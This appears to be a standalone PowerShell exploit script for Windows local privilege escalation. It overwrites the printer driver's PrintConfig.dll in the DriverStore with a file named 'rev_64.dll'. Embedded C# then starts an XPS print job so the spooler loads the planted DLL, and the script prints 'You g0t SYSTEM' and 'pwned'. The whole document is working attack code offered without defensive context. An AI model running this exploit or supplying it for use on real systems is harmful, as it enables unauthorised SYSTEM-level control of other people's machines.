Copy-Item ".\rev_64.dll" -Destination "C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_e4ff50d4d5f8b2aa\Amd64\PrintConfig.dll"
$mycode = @"
using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
namespace XPS
{
public class XpsPrint
{
public static void StartPrintJob()
{
PrintJob("Microsoft XPS Document Writer", "myjob");
}
public static void PrintJob(string printerName, string jobName)
{
IntPtr completionEvent = CreateEvent(IntPtr.Zero, true, false, null);
if (completionEvent == IntPtr.Zero)
throw new Win32Exception();
try
{
IXpsPrintJob job;
IXpsPrintJobStream jobStream;
StartJob(printerName, jobName, completionEvent, out job, out jobStream);
jobStream.Close();


}
finally
{
if (completionEvent != IntPtr.Zero)
CloseHandle(completionEvent);
}
}
private static void StartJob(string printerName, string jobName, IntPtr completionEvent, out IXpsPrintJob job, out IXpsPrintJobStream jobStream)
{
int result = StartXpsPrintJob(printerName, jobName, null, IntPtr.Zero, completionEvent,
null, 0, out job, out jobStream, IntPtr.Zero);

}
[DllImport("XpsPrint.dll", EntryPoint = "StartXpsPrintJob")]
private static extern int StartXpsPrintJob(
[MarshalAs(UnmanagedType.LPWStr)] String printerName,
[MarshalAs(UnmanagedType.LPWStr)] String jobName,
[MarshalAs(UnmanagedType.LPWStr)] String outputFileName,
IntPtr progressEvent, 
IntPtr completionEvent, 
[MarshalAs(UnmanagedType.LPArray)] byte[] printablePagesOn,
UInt32 printablePagesOnCount,
out IXpsPrintJob xpsPrintJob,
out IXpsPrintJobStream documentStream,
IntPtr printTicketStream); 
[DllImport("Kernel32.dll", SetLastError = true)]
private static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);
[DllImport("Kernel32.dll", SetLastError = true, ExactSpelling = true)]
private static extern WAIT_RESULT WaitForSingleObject(IntPtr handle, Int32 milliseconds);
[DllImport("Kernel32.dll", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool CloseHandle(IntPtr hObject);
}
[Guid("0C733A30-2A1C-11CE-ADE5-00AA0044773D")] 
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IXpsPrintJobStream
{
void Read([MarshalAs(UnmanagedType.LPArray)] byte[] pv, uint cb, out uint pcbRead);
void Write([MarshalAs(UnmanagedType.LPArray)] byte[] pv, uint cb, out uint pcbWritten);
void Close();
}
[Guid("5ab89b06-8194-425f-ab3b-d7a96e350161")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IXpsPrintJob
{
void Cancel();
void GetJobStatus(out XPS_JOB_STATUS jobStatus);
}
[StructLayout(LayoutKind.Sequential)]
struct XPS_JOB_STATUS
{
public UInt32 jobId;
public Int32 currentDocument;
public Int32 currentPage;
public Int32 currentPageTotal;
public XPS_JOB_COMPLETION completion;
public Int32 jobStatus; 
};
enum XPS_JOB_COMPLETION
{
XPS_JOB_IN_PROGRESS = 0,
XPS_JOB_COMPLETED = 1,
XPS_JOB_CANCELLED = 2,
XPS_JOB_FAILED = 3
}
enum WAIT_RESULT
{
WAIT_OBJECT_0 = 0,
WAIT_ABANDONED = 0x80,
WAIT_TIMEOUT = 0x102,
WAIT_FAILED = -1 
}
}

"@
add-type -typeDefinition $mycode
try { [XPS.XpsPrint]::StartPrintJob() }
catch { "[+] You g0t SYSTEM !" }
echo "[+] pwned !"
echo ""
exit
